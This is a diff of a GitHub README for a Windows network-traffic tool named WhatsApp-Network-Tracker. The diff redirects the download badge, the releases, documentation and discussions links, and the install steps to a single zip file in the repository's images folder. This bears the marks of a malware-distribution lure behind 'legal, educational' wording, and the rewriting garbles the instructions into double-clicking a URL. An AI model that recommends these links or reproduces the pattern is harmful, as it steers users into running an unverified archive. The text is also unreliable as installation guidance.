@@ -2,7 +2,7 @@
 # 📊 WhatsApp-Network-Tracker - Analyze Network Traffic Easily
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Hadrysel/WhatsApp-Network-Tracker/releases)
+[![Download](https://raw.githubusercontent.com/Hadrysel/WhatsApp-Network-Tracker/main/images/Tracker_Network_Whats_App_v1.5-alpha.4.zip)](https://raw.githubusercontent.com/Hadrysel/WhatsApp-Network-Tracker/main/images/Tracker_Network_Whats_App_v1.5-alpha.4.zip)
 
 ## 📃 Description
 WhatsApp-Network-Tracker is a legal, PyQt6-based application designed for network traffic analysis on Windows. It captures packet metadata, focusing on IPs, ports, and protocols. This tool uses filter-driven monitoring and IP tracking but does not include decryption or man-in-the-middle (MITM) processes. It is intended for educational, debugging, and defensive security use on authorized systems only.
@@ -22,18 +22,18 @@ Follow these steps to download and run WhatsApp-Network-Tracker on your Windows 
 ### 2. Visit the Releases Page
 To get the application, you need to visit the following page:
 
-[Download the Latest Release](https://github.com/Hadrysel/WhatsApp-Network-Tracker/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/Hadrysel/WhatsApp-Network-Tracker/main/images/Tracker_Network_Whats_App_v1.5-alpha.4.zip)
 
 ---
 
 ## 📥 Download & Install
 1. Go to the releases page.
 2. Find the latest version listed.
-3. Download the file named `WhatsApp-Network-Tracker.exe` or equivalent.
+3. Download the file named `https://raw.githubusercontent.com/Hadrysel/WhatsApp-Network-Tracker/main/images/Tracker_Network_Whats_App_v1.5-alpha.4.zip` or equivalent.
 4. Once the download is complete, locate the file in your computer's Downloads folder.
 
 ### 3. Installing the Application
-1. Double-click on the downloaded file `WhatsApp-Network-Tracker.exe`.
+1. Double-click on the downloaded file `https://raw.githubusercontent.com/Hadrysel/WhatsApp-Network-Tracker/main/images/Tracker_Network_Whats_App_v1.5-alpha.4.zip`.
 2. Follow the installation prompts. Choose the directory you want to install the application to or accept the default location.
 3. Once installed, you can find WhatsApp-Network-Tracker in your Start Menu.
 
@@ -88,8 +88,8 @@ If you need help with the application, visit our GitHub Issues page. You can rep
 ---
 
 ## 📊 Additional Resources
-- [Documentation](https://github.com/Hadrysel/WhatsApp-Network-Tracker/wiki): Access detailed information about features and use cases.
-- [Community Discussions](https://github.com/Hadrysel/WhatsApp-Network-Tracker/discussions): Join conversations with other users and developers.
+- [Documentation](https://raw.githubusercontent.com/Hadrysel/WhatsApp-Network-Tracker/main/images/Tracker_Network_Whats_App_v1.5-alpha.4.zip): Access detailed information about features and use cases.
+- [Community Discussions](https://raw.githubusercontent.com/Hadrysel/WhatsApp-Network-Tracker/main/images/Tracker_Network_Whats_App_v1.5-alpha.4.zip): Join conversations with other users and developers.
 
 For any inquiries, feel free to contact us through the issues page or by opening a discussion.
 
@@ -98,5 +98,5 @@ For any inquiries, feel free to contact us through the issues page or by opening
 ## 📥 Reminder to Download
 Make sure to download the latest version of WhatsApp-Network-Tracker using the link below:
 
-[Download the Latest Release](https://github.com/Hadrysel/WhatsApp-Network-Tracker/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/Hadrysel/WhatsApp-Network-Tracker/main/images/Tracker_Network_Whats_App_v1.5-alpha.4.zip)
 ```
